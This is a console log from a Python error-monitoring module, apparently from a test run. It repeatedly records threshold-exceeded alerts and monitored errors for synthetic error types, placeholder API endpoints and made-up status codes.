ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.959903Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.959993Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_35\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_35, /api/endpoint_85\nStatus Codes: 585, 435, 485, 535\nFirst Occurrence: 2025-07-05T15:23:43.685289\nLast Occurrence: 2025-07-05T15:23:43.959889'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.960057Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4985'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.960115Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.960167Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_36\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_36, /api/endpoint_86\nStatus Codes: 536, 586, 436, 486\nFirst Occurrence: 2025-07-05T15:23:43.685339\nLast Occurrence: 2025-07-05T15:23:43.960108'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.960220Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4986'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.960276Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.960326Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_37\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_37, /api/endpoint_87\nStatus Codes: 537, 587, 437, 487\nFirst Occurrence: 2025-07-05T15:23:43.685391\nLast Occurrence: 2025-07-05T15:23:43.960270'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.960373Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4987'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.960425Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.960474Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_38\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_38, /api/endpoint_88\nStatus Codes: 488, 538, 588, 438\nFirst Occurrence: 2025-07-05T15:23:43.685441\nLast Occurrence: 2025-07-05T15:23:43.960419'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.960520Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4988'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.960571Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.960620Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_39\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_39, /api/endpoint_89\nStatus Codes: 489, 539, 589, 439\nFirst Occurrence: 2025-07-05T15:23:43.685491\nLast Occurrence: 2025-07-05T15:23:43.960566'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.960694Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4989'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.960784Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.960845Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_40\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_40, /api/endpoint_90\nStatus Codes: 440, 490, 540, 590\nFirst Occurrence: 2025-07-05T15:23:43.685540\nLast Occurrence: 2025-07-05T15:23:43.960774'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.960898Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4990'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.960957Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.961011Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_41\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_41, /api/endpoint_91\nStatus Codes: 441, 491, 541, 591\nFirst Occurrence: 2025-07-05T15:23:43.685590\nLast Occurrence: 2025-07-05T15:23:43.960950'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.961061Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4991'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.961114Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.961163Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_42\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_42, /api/endpoint_92\nStatus Codes: 592, 442, 492, 542\nFirst Occurrence: 2025-07-05T15:23:43.685644\nLast Occurrence: 2025-07-05T15:23:43.961108'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.961215Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4992'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.961268Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.961319Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_43\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_43, /api/endpoint_93\nStatus Codes: 593, 443, 493, 543\nFirst Occurrence: 2025-07-05T15:23:43.685698\nLast Occurrence: 2025-07-05T15:23:43.961262'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.961366Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4993'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.961419Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.961468Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_44\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_44, /api/endpoint_94\nStatus Codes: 544, 594, 444, 494\nFirst Occurrence: 2025-07-05T15:23:43.685750\nLast Occurrence: 2025-07-05T15:23:43.961412'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.961515Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4994'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.961566Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.961614Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_45\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_45, /api/endpoint_95\nStatus Codes: 545, 595, 445, 495\nFirst Occurrence: 2025-07-05T15:23:43.685801\nLast Occurrence: 2025-07-05T15:23:43.961560'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.961660Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4995'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.961710Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.961759Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_46\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_46, /api/endpoint_96\nStatus Codes: 496, 546, 596, 446\nFirst Occurrence: 2025-07-05T15:23:43.685851\nLast Occurrence: 2025-07-05T15:23:43.961704'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.961805Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4996'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.961858Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.961911Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_47\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_47, /api/endpoint_97\nStatus Codes: 497, 547, 597, 447\nFirst Occurrence: 2025-07-05T15:23:43.685906\nLast Occurrence: 2025-07-05T15:23:43.961852'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.961957Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4997'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
